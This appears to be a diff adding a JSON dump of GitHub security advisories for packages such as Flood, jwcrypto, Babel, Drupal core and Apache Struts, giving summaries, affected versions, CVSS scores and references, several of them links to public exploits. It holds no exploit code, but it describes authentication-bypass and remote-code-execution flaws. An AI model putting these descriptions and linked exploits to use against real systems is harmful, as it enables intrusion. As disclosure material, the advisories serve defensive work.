@@ -1,0 +1,1321 @@
+[
+  {
+    "ghsa_id": "GHSA-r587-7jh2-4qr3",
+    "cve_id": null,
+    "url": "https://api.github.com/advisories/GHSA-r587-7jh2-4qr3",
+    "html_url": "https://github.com/advisories/GHSA-r587-7jh2-4qr3",
+    "summary": "Server secret was included in static assets and served to clients",
+    "description": "### Impact\nServer JWT signing secret was included in static assets and served to clients.\n\nThis ALLOWS Flood's builtin authentication to be bypassed. Given Flood is granted access to rTorrent's SCGI interface (which is unprotected and ALLOWS arbitrary code execution) and usually wide-ranging privileges to files, along with Flood's lack of security controls against authenticated users, the severity of this vulnerability is **CRITICAL**. \n\n### Background\nCommit 8d11640b imported `config.js` to client (frontend) components to get `disableUsersAndAuth` configuration variable. Subsequently contents of `config.js` are compiled into static assets and served to users. Unfortunately `config.js` also includes `secret`.\n\nIntruders can use `secret` to sign authentication tokens themselves to bypass builtin access control of Flood.\n\n### Patches\nCommit 042cb4ce removed imports of `config.js` from client (frontend) components. Additionally an eslint rule was added to prevent config.js from being imported to client (frontend) components.\n\nCommit 103f53c8 provided a general mitigation to this kind of problem by searching static assets to ensure `secret` is not included before starting server (backend). \n\n### Workarounds\nUsers shall upgrade if they use Flood's builtin authentication system.\n\nWhile maintainers will do their best to support it, Flood cannot guarantee its in-house access control system can stand against determined attackers in high-stake environments. \n\n\u003e Use `HTTP Basic Auth` or other battle-hardened authentication methods instead of Flood's in-house one. You can use `disableUsersAndAuth` to avoid duplicate authentication.\n\nUsers are advised to check out the [wiki](https://github.com/jesec/flood/wiki) for more information on security precautions.\n\n### References\n[Wiki - Security precautions](https://github.com/jesec/flood/wiki/Security-precautions)\n\n[Introduction to JSON Web Tokens](https://jwt.io/introduction/)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [issue tracker](https://github.com/jesec/flood/issues)\n* Email us at [jc@linux.com](mailto:jc@linux.com)",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/jesec/flood/security-advisories/GHSA-r587-7jh2-4qr3",
+    "source_code_location": "https://github.com/jesec/flood",
+    "identifiers": [
+      {
+        "value": "GHSA-r587-7jh2-4qr3",
+        "type": "GHSA"
+      }
+    ],
+    "references": [
+      "https://github.com/jesec/flood/security/advisories/GHSA-r587-7jh2-4qr3",
+      "https://github.com/jesec/flood/commit/103f53c8d2963584e41bcf46ccc6fe0fabf179ca",
+      "https://github.com/jesec/flood/commit/d137107ac908526d43966607149fbaf00cfcedf0",
+      "https://github.com/advisories/GHSA-r587-7jh2-4qr3"
+    ],
+    "published_at": "2020-08-26T19:32:50Z",
+    "updated_at": "2023-01-06T05:01:57Z",
+    "github_reviewed_at": "2020-08-26T19:32:37Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "flood"
+        },
+        "vulnerable_version_range": "\u003e= 2.0.0, \u003c 3.0.0",
+        "first_patched_version": "3.0.0",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [],
+    "credits": [
+      {
+        "user": {
+          "login": "jesec",
+          "id": 11585141,
+          "node_id": "MDQ6VXNlcjExNTg1MTQx",
+          "avatar_url": "https://avatars.githubusercontent.com/u/11585141?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/jesec",
+          "html_url": "https://github.com/jesec",
+          "followers_url": "https://api.github.com/users/jesec/followers",
+          "following_url": "https://api.github.com/users/jesec/following{/other_user}",
+          "gists_url": "https://api.github.com/users/jesec/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/jesec/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/jesec/subscriptions",
+          "organizations_url": "https://api.github.com/users/jesec/orgs",
+          "repos_url": "https://api.github.com/users/jesec/repos",
+          "events_url": "https://api.github.com/users/jesec/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/jesec/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "analyst"
+      }
+    ],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-gwp4-mcv4-w95j",
+    "cve_id": "CVE-2022-3102",
+    "url": "https://api.github.com/advisories/GHSA-gwp4-mcv4-w95j",
+    "html_url": "https://github.com/advisories/GHSA-gwp4-mcv4-w95j",
+    "summary": "jwcrypto token substitution can lead to authentication bypass",
+    "description": "The JWT code can auto-detect the type of token being provided, and this can lead the application to incorrect conclusions about the trustworthiness of the token.\nQuoting the private disclosure we received : \"Under certain circumstances, it is possible to substitute a [..] signed JWS with a JWE that is encrypted with the public key that is normally used for signature validation.\"\nThis substitution attack can occur only if the validating application also have access to the private key, normally used to sign the tokens, available during validation of the received JWT.\nThe significance of this attacks depends on the use of the token, it may lead to authentication bypass or authorization bypass (respectively if claims are used to authenticate or authorize certain actions), because the attacker has full control of the data placed in the JWE and can inject any desired claim value.\n\nSeveral mitigating factors exist that can protect applications from this issue:\n- If the private key corresponding to the public key used to encrypt the JWE is not available to the application an exception will be raised.\n- If the JWK is specified with the 'use' parameter set to 'sig' (as expected for keys used only for signing/verification) an exception will be raised.\n- If the JWK is specified with the 'key_ops' parameter set and it does not include the 'decrypt' operation an exception will be raised.\n- Applications may check the token type before validation, in this case they would fail to detect an expected JWS\n\nNormally, signing and validation are done by different applications, so this scenario should be unlikely. However it is possible to have applications that both sign and validate tokens and do not separate JWKs in use, or do not set a JWK 'use' type.\n\nDue to the mitigating factors, and the fact that specific operational constraints and conditions need to be in place to successfully exploit this issue to generate an authentication bypass, we rate this security issue as moderate. Other avenues may decide on a different rating based on use case, always verify what conditions apply to your use of the library to assess risk.\n\nMany thanks to Tom Tervoort of Secura for finding and reporting this issue.\n",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": "https://api.github.com/repos/latchset/jwcrypto/security-advisories/GHSA-gwp4-mcv4-w95j",
+    "source_code_location": "https://github.com/latchset/jwcrypto",
+    "identifiers": [
+      {
+        "value": "GHSA-gwp4-mcv4-w95j",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2022-3102",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/latchset/jwcrypto/security/advisories/GHSA-gwp4-mcv4-w95j",
+      "https://github.com/latchset/jwcrypto/commit/f4e912f83cb578e2cd47f8a9398bf15f680bf558",
+      "https://github.com/latchset/jwcrypto/releases/tag/v1.4.0",
+      "https://github.com/advisories/GHSA-gwp4-mcv4-w95j"
+    ],
+    "published_at": "2022-09-21T16:58:31Z",
+    "updated_at": "2023-01-07T05:02:37Z",
+    "github_reviewed_at": "2022-09-21T16:58:31Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "jwcrypto"
+        },
+        "vulnerable_version_range": "\u003c 1.4",
+        "first_patched_version": "1.4",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [],
+    "credits": [],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-26hg-crh6-mjrw",
+    "cve_id": null,
+    "url": "https://api.github.com/advisories/GHSA-26hg-crh6-mjrw",
+    "html_url": "https://github.com/advisories/GHSA-26hg-crh6-mjrw",
+    "summary": "Directory Traversal",
+    "description": "Affected versions of list-n-stream package (0.0.10 and before), are vulnerable to a directory traversal issue.",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": null,
+    "source_code_location": "",
+    "identifiers": [
+      {
+        "value": "GHSA-26hg-crh6-mjrw",
+        "type": "GHSA"
+      }
+    ],
+    "references": [
+      "https://github.com/KoryNunn/list-n-stream/commit/99b0b40b34aaedfcdf25da46bef0a06b9c47fb59#diff-78c12f5adc1848d13b1c6f07055d996e",
+      "https://github.com/advisories/GHSA-26hg-crh6-mjrw"
+    ],
+    "published_at": "2021-02-23T21:28:28Z",
+    "updated_at": "2023-01-09T05:01:18Z",
+    "github_reviewed_at": "2019-05-29T20:01:50Z",
+    "nvd_published_at": null,
+    "withdrawn_at": "2021-02-23T21:28:28Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "list-n-stream"
+        },
+        "vulnerable_version_range": "\u003c 0.0.11",
+        "first_patched_version": "0.0.11",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [],
+    "credits": [],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    }
+  },
+  {
+    "ghsa_id": "GHSA-crmx-v835-hcp4",
+    "cve_id": "CVE-2017-17461",
+    "url": "https://api.github.com/advisories/GHSA-crmx-v835-hcp4",
+    "html_url": "https://github.com/advisories/GHSA-crmx-v835-hcp4",
+    "summary": "Moderate severity vulnerability that affects marked",
+    "description": "# Withdrawn\n\nThis advisory has been withdrawn, per NVD: [\"This candidate was withdrawn by its CNA. Further investigation showed that it was not a security issue.\"](https://nvd.nist.gov/vuln/detail/CVE-2017-17461)\n\n# Original Description\n\nA Regular expression Denial of Service (ReDoS) vulnerability in the file marked.js of the marked npm package (tested on version 0.3.7) allows a remote attacker to overload and crash a server by passing a maliciously crafted string.",
+    "type": "reviewed",
+    "severity": "medium",
+    "repository_advisory_url": null,
+    "source_code_location": "",
+    "identifiers": [
+      {
+        "value": "GHSA-crmx-v835-hcp4",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2017-17461",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2017-17461",
+      "https://github.com/advisories/GHSA-crmx-v835-hcp4"
+    ],
+    "published_at": "2018-01-04T21:04:09Z",
+    "updated_at": "2023-01-09T05:03:05Z",
+    "github_reviewed_at": "2020-06-16T21:32:51Z",
+    "nvd_published_at": null,
+    "withdrawn_at": "2021-12-02T22:47:36Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "marked"
+        },
+        "vulnerable_version_range": "\u003c 0.3.9",
+        "first_patched_version": "0.3.9",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": null,
+        "score": 0.0
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [],
+    "credits": [],
+    "cvss": {
+      "vector_string": null,
+      "score": null
+    },
+    "epss": {
+      "percentage": 0.00266,
+      "percentile": 0.67501
+    }
+  },
+  {
+    "ghsa_id": "GHSA-34p9-f4q3-c4r7",
+    "cve_id": "CVE-2016-10931",
+    "url": "https://api.github.com/advisories/GHSA-34p9-f4q3-c4r7",
+    "html_url": "https://github.com/advisories/GHSA-34p9-f4q3-c4r7",
+    "summary": "Improper Certificate Validation in openssl",
+    "description": "All versions of rust-openssl prior to 0.9.0 contained numerous insecure defaults including off-by-default certificate verification and no API to perform hostname verification. Unless configured correctly by a developer, these defaults could allow an attacker to perform man-in-the-middle attacks. The problem was addressed in newer versions by enabling certificate verification by default and exposing APIs to perform hostname verification. Use the SslConnector and SslAcceptor types to take advantage of these new features (as opposed to the lower-level SslContext type).",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/sfackler/rust-openssl",
+    "identifiers": [
+      {
+        "value": "GHSA-34p9-f4q3-c4r7",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2016-10931",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2016-10931",
+      "https://github.com/sfackler/rust-openssl/releases/tag/v0.9.0",
+      "https://rustsec.org/advisories/RUSTSEC-2016-0001.html",
+      "https://github.com/advisories/GHSA-34p9-f4q3-c4r7"
+    ],
+    "published_at": "2021-08-25T20:43:11Z",
+    "updated_at": "2023-06-13T20:14:10Z",
+    "github_reviewed_at": "2021-08-19T21:25:06Z",
+    "nvd_published_at": "2019-08-26T12:15:00Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "rust",
+          "name": "openssl"
+        },
+        "vulnerable_version_range": "\u003c 0.9.0",
+        "first_patched_version": "0.9.0",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "score": 8.1
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-295",
+        "name": "Improper Certificate Validation"
+      }
+    ],
+    "credits": [],
+    "cvss": {
+      "vector_string": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "score": 8.1
+    },
+    "epss": {
+      "percentage": 0.00183,
+      "percentile": 0.40274
+    }
+  },
+  {
+    "ghsa_id": "GHSA-h4m5-qpfp-3mpv",
+    "cve_id": "CVE-2021-42771",
+    "url": "https://api.github.com/advisories/GHSA-h4m5-qpfp-3mpv",
+    "html_url": "https://github.com/advisories/GHSA-h4m5-qpfp-3mpv",
+    "summary": "Directory Traversal in Babel",
+    "description": "Babel.Locale in Babel before 2.9.1 allows attackers to load arbitrary locale .dat files (containing serialized Python objects) via directory traversal, leading to code execution.",
+    "type": "reviewed",
+    "severity": "high",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/python-babel/babel/",
+    "identifiers": [
+      {
+        "value": "GHSA-h4m5-qpfp-3mpv",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2021-42771",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-42771",
+      "https://github.com/python-babel/babel/pull/782",
+      "https://lists.debian.org/debian-lts/2021/10/msg00040.html",
+      "https://www.tenable.com/security/research/tra-2021-14",
+      "https://lists.debian.org/debian-lts-announce/2021/10/msg00018.html",
+      "https://www.debian.org/security/2021/dsa-5018",
+      "https://github.com/python-babel/babel/commit/412015ef642bfcc0d8ba8f4d05cdbb6aac98d9b3",
+      "https://github.com/advisories/GHSA-h4m5-qpfp-3mpv",
+      "https://github.com/pypa/advisory-database/tree/main/vulns/babel/PYSEC-2021-421.yaml"
+    ],
+    "published_at": "2021-10-21T17:49:59Z",
+    "updated_at": "2024-09-12T20:56:03Z",
+    "github_reviewed_at": "2021-10-21T14:33:55Z",
+    "nvd_published_at": "2021-10-20T21:15:00Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "pip",
+          "name": "babel"
+        },
+        "vulnerable_version_range": "\u003c 2.9.1",
+        "first_patched_version": "2.9.1",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+        "score": 7.8
+      },
+      "cvss_v4": {
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+        "score": 8.7
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-22",
+        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+      }
+    ],
+    "credits": [],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "score": 7.8
+    },
+    "epss": {
+      "percentage": 0.00207,
+      "percentile": 0.42879
+    }
+  },
+  {
+    "ghsa_id": "GHSA-7fh9-933g-885p",
+    "cve_id": "CVE-2018-7600",
+    "url": "https://api.github.com/advisories/GHSA-7fh9-933g-885p",
+    "html_url": "https://github.com/advisories/GHSA-7fh9-933g-885p",
+    "summary": "Drupal Core Remote Code Execution Vulnerability",
+    "description": "Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/drupal/core",
+    "identifiers": [
+      {
+        "value": "GHSA-7fh9-933g-885p",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2018-7600",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2018-7600",
+      "https://blog.appsecco.com/remote-code-execution-with-drupal-core-sa-core-2018-002-95e6ecc0c714",
+      "https://github.com/a2u/CVE-2018-7600",
+      "https://github.com/g0rx/CVE-2018-7600-Drupal-RCE",
+      "https://greysec.net/showthread.php?tid=2912\u0026pid=10561",
+      "https://groups.drupal.org/security/faq-2018-002",
+      "https://lists.debian.org/debian-lts-announce/2018/03/msg00028.html",
+      "https://twitter.com/RicterZ/status/979567469726613504",
+      "https://twitter.com/RicterZ/status/984495201354854401",
+      "https://twitter.com/arancaytar/status/979090719003627521",
+      "https://www.debian.org/security/2018/dsa-4156",
+      "https://www.drupal.org/sa-core-2018-002",
+      "https://www.synology.com/support/security/Synology_SA_18_17",
+      "https://www.tenable.com/blog/critical-drupal-core-vulnerability-what-you-need-to-know",
+      "http://www.securityfocus.com/bid/103534",
+      "http://www.securitytracker.com/id/1040598",
+      "https://www.exploit-db.com/exploits/44482",
+      "https://www.exploit-db.com/exploits/44449",
+      "https://www.exploit-db.com/exploits/44448",
+      "https://research.checkpoint.com/uncovering-drupalgeddon-2",
+      "https://github.com/FriendsOfPHP/security-advisories/blob/master/drupal/drupal/CVE-2018-7600.yaml",
+      "https://github.com/FriendsOfPHP/security-advisories/blob/master/drupal/core/CVE-2018-7600.yaml",
+      "https://badpackets.net/over-100000-drupal-websites-vulnerable-to-drupalgeddon-2-cve-2018-7600",
+      "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2018-7600",
+      "https://github.com/advisories/GHSA-7fh9-933g-885p"
+    ],
+    "published_at": "2022-05-14T01:29:45Z",
+    "updated_at": "2025-10-22T17:30:08Z",
+    "github_reviewed_at": "2024-04-23T22:36:48Z",
+    "nvd_published_at": "2018-03-29T07:29:00Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "drupal/core"
+        },
+        "vulnerable_version_range": "\u003e= 7.0, \u003c 7.58",
+        "first_patched_version": "7.58",
+        "vulnerable_functions": []
+      },
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "drupal/core"
+        },
+        "vulnerable_version_range": "\u003e= 8.0, \u003c 8.3.9",
+        "first_patched_version": "8.3.9",
+        "vulnerable_functions": []
+      },
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "drupal/core"
+        },
+        "vulnerable_version_range": "\u003e= 8.4.0, \u003c 8.4.6",
+        "first_patched_version": "8.4.6",
+        "vulnerable_functions": []
+      },
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "drupal/core"
+        },
+        "vulnerable_version_range": "\u003e= 8.5.0, \u003c 8.5.1",
+        "first_patched_version": "8.5.1",
+        "vulnerable_functions": []
+      },
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "drupal/drupal"
+        },
+        "vulnerable_version_range": "\u003e= 7.0, \u003c 7.58",
+        "first_patched_version": "7.58",
+        "vulnerable_functions": []
+      },
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "drupal/drupal"
+        },
+        "vulnerable_version_range": "\u003e= 8.0, \u003c 8.3.9",
+        "first_patched_version": "8.3.9",
+        "vulnerable_functions": []
+      },
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "drupal/drupal"
+        },
+        "vulnerable_version_range": "\u003e= 8.4, \u003c 8.4.6",
+        "first_patched_version": "8.4.6",
+        "vulnerable_functions": []
+      },
+      {
+        "package": {
+          "ecosystem": "composer",
+          "name": "drupal/drupal"
+        },
+        "vulnerable_version_range": "\u003e= 8.5, \u003c 8.5.1",
+        "first_patched_version": "8.5.1",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H",
+        "score": 9.8
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-20",
+        "name": "Improper Input Validation"
+      }
+    ],
+    "credits": [],
+    "cvss": {
+      "vector_string": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H",
+      "score": 9.8
+    },
+    "epss": {
+      "percentage": 0.94489,
+      "percentile": 0.99999
+    }
+  },
+  {
+    "ghsa_id": "GHSA-j77q-2qqg-6989",
+    "cve_id": "CVE-2017-5638",
+    "url": "https://api.github.com/advisories/GHSA-j77q-2qqg-6989",
+    "html_url": "https://github.com/advisories/GHSA-j77q-2qqg-6989",
+    "summary": "Apache Struts vulnerable to remote arbitrary command execution due to improper input validation",
+    "description": "Apache Struts versions prior to 2.3.32 and 2.5.10.1 contain incorrect exception handling and error-message generation during file-upload attempts using the Jakarta Multipart parser, which allows remote attackers to execute arbitrary commands via a crafted Content-Type, Content-Disposition, or Content-Length HTTP header, as exploited in the wild in March 2017 with a Content-Type header containing a #cmd= string.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": null,
+    "source_code_location": "https://github.com/apache/struts",
+    "identifiers": [
+      {
+        "value": "GHSA-j77q-2qqg-6989",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2017-5638",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2017-5638",
+      "https://github.com/rapid7/metasploit-framework/issues/8064",
+      "https://cwiki.apache.org/confluence/display/WW/S2-045",
+      "https://cwiki.apache.org/confluence/display/WW/S2-046",
+      "https://exploit-db.com/exploits/41570",
+      "https://git1-us-west.apache.org/repos/asf?p=struts.git;a=commit;h=352306493971e7d5a756d61780d57a76eb1f519a",
+      "https://git1-us-west.apache.org/repos/asf?p=struts.git;a=commit;h=6b8272ce47160036ed120a48345d9aa884477228",
+      "https://github.com/advisories/GHSA-j77q-2qqg-6989",
+      "https://github.com/mazen160/struts-pwn",
+      "https://h20566.www2.hpe.com/hpsc/doc/public/display?docLocale=en_US\u0026docId=emr_na-hpesbgn03733en_us",
+      "https://h20566.www2.hpe.com/hpsc/doc/public/display?docLocale=en_US\u0026docId=emr_na-hpesbgn03749en_us",
+      "https://h20566.www2.hpe.com/hpsc/doc/public/display?docLocale=en_US\u0026docId=emr_na-hpesbhf03723en_us",
+      "https://isc.sans.edu/diary/22169",
+      "https://lists.apache.org/thread.html/r1125f3044a0946d1e7e6f125a6170b58d413ebd4a95157e4608041c7@%3Cannounce.apache.org%3E",
+      "https://lists.apache.org/thread.html/r6d03e45b81eab03580cf7f8bb51cb3e9a1b10a2cc0c6a2d3cc92ed0c@%3Cannounce.apache.org%3E",
+      "https://lists.apache.org/thread.html/r90890afea72a9571d666820b2fe5942a0a5f86be406fa31da3dd0922@%3Cannounce.apache.org%3E",
+      "https://nmap.org/nsedoc/scripts/http-vuln-cve2017-5638.html",
+      "https://packetstormsecurity.com/files/141494/S2-45-poc.py.txt",
+      "https://struts.apache.org/docs/s2-045.html",
+      "https://struts.apache.org/docs/s2-046.html",
+      "https://support.lenovo.com/us/en/product_security/len-14200",
+      "https://twitter.com/theog150/status/841146956135124993",
+      "https://www.kb.cert.org/vuls/id/834067",
+      "https://www.symantec.com/security-center/network-protection-security-advisories/SA145",
+      "http://blog.talosintelligence.com/2017/03/apache-0-day-exploited.html",
+      "http://www.arubanetworks.com/assets/alert/ARUBA-PSA-2017-002.txt",
+      "http://www.eweek.com/security/apache-struts-vulnerability-under-attack.html",
+      "http://www.oracle.com/technetwork/security-advisory/cpujul2017-3236622.html",
+      "https://github.com/apache/struts/commit/352306493971e7d5a756d61780d57a76eb1f519a",
+      "https://github.com/apache/struts/commit/b06dd50af2a3319dd896bf5c2f4972d2b772cf2b",
+      "https://web.archive.org/web/20170311203630/http://www.securityfocus.com/bid/96729",
+      "https://web.archive.org/web/20170921030226/http://www.securitytracker.com/id/1037973",
+      "https://lists.apache.org/thread.html/r90890afea72a9571d666820b2fe5942a0a5f86be406fa31da3dd0922%40%3Cannounce.apache.org%3E",
+      "https://security.netapp.com/advisory/ntap-20170310-0001",
+      "https://www.exploit-db.com/exploits/41614",
+      "https://www.imperva.com/blog/2017/03/cve-2017-5638-new-remote-code-execution-rce-vulnerability-in-apache-struts-2",
+      "https://arstechnica.com/security/2017/03/critical-vulnerability-under-massive-attack-imperils-high-impact-sites",
+      "https://git1-us-west.apache.org/repos/asf?p=struts.git%3Ba=commit%3Bh=352306493971e7d5a756d61780d57a76eb1f519a",
+      "https://git1-us-west.apache.org/repos/asf?p=struts.git%3Ba=commit%3Bh=6b8272ce47160036ed120a48345d9aa884477228",
+      "https://lists.apache.org/thread.html/r1125f3044a0946d1e7e6f125a6170b58d413ebd4a95157e4608041c7%40%3Cannounce.apache.org%3E",
+      "https://lists.apache.org/thread.html/r6d03e45b81eab03580cf7f8bb51cb3e9a1b10a2cc0c6a2d3cc92ed0c%40%3Cannounce.apache.org%3E",
+      "http://blog.trendmicro.com/trendlabs-security-intelligence/cve-2017-5638-apache-struts-vulnerability-remote-code-execution",
+      "http://www.securityfocus.com/bid/96729",
+      "http://www.securitytracker.com/id/1037973",
+      "https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2017-5638"
+    ],
+    "published_at": "2018-10-18T19:24:26Z",
+    "updated_at": "2025-10-22T17:33:27Z",
+    "github_reviewed_at": "2020-06-16T21:42:23Z",
+    "nvd_published_at": "2017-03-11T02:59:00Z",
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "org.apache.struts:struts2-core"
+        },
+        "vulnerable_version_range": "\u003e= 2.3.0, \u003c= 2.3.31",
+        "first_patched_version": "2.3.32",
+        "vulnerable_functions": []
+      },
+      {
+        "package": {
+          "ecosystem": "maven",
+          "name": "org.apache.struts:struts2-core"
+        },
+        "vulnerable_version_range": "\u003e= 2.5.0, \u003c= 2.5.10",
+        "first_patched_version": "2.5.10.1",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H",
+        "score": 10.0
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-20",
+        "name": "Improper Input Validation"
+      },
+      {
+        "cwe_id": "CWE-755",
+        "name": "Improper Handling of Exceptional Conditions"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "sunSUNQ",
+          "id": 33311698,
+          "node_id": "MDQ6VXNlcjMzMzExNjk4",
+          "avatar_url": "https://avatars.githubusercontent.com/u/33311698?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/sunSUNQ",
+          "html_url": "https://github.com/sunSUNQ",
+          "followers_url": "https://api.github.com/users/sunSUNQ/followers",
+          "following_url": "https://api.github.com/users/sunSUNQ/following{/other_user}",
+          "gists_url": "https://api.github.com/users/sunSUNQ/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/sunSUNQ/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/sunSUNQ/subscriptions",
+          "organizations_url": "https://api.github.com/users/sunSUNQ/orgs",
+          "repos_url": "https://api.github.com/users/sunSUNQ/repos",
+          "events_url": "https://api.github.com/users/sunSUNQ/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/sunSUNQ/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "analyst"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H",
+      "score": 10.0
+    },
+    "epss": {
+      "percentage": 0.94267,
+      "percentile": 0.9993
+    }
+  },
+  {
+    "ghsa_id": "GHSA-jfh8-c2jp-5v3q",
+    "cve_id": "CVE-2021-44228",
+    "url": "https://api.github.com/advisories/GHSA-jfh8-c2jp-5v3q",
+    "html_url": "https://github.com/advisories/GHSA-jfh8-c2jp-5v3q",
+    "summary": "Remote code injection in Log4j",
